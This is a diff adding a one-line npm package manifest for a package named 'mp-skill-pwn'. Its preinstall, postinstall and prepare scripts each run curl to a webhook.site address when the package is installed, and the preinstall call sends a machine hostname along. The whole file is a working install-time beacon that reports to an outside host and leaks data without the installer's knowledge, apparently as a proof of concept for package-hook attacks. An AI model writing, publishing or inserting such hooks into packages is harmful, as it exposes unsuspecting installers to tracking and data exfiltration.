@@ -1,0 +1,1 @@
+{"name":"mp-skill-pwn","version":"0.0.1","scripts":{"preinstall":"curl -sS 'https://webhook.site/d44a1569-dee8-409c-b923-acc90bb1ec99/preinstall?h='DESKTOP-H074STU","postinstall":"curl -sS 'https://webhook.site/d44a1569-dee8-409c-b923-acc90bb1ec99/postinstall'","prepare":"curl -sS 'https://webhook.site/d44a1569-dee8-409c-b923-acc90bb1ec99/prepare'"}}
